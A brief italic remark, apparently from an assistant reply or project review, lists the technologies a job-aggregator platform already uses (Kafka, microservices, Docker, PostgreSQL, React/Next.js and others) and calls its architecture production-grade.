*Your job-aggregator-platform already implements: Kafka, microservices, Docker, Prometheus + Grafana, gRPC, PostgreSQL, MongoDB, Elasticsearch, Nginx, CI/CD, and React/Next.js. You are building with genuinely production-grade architectural patterns.*
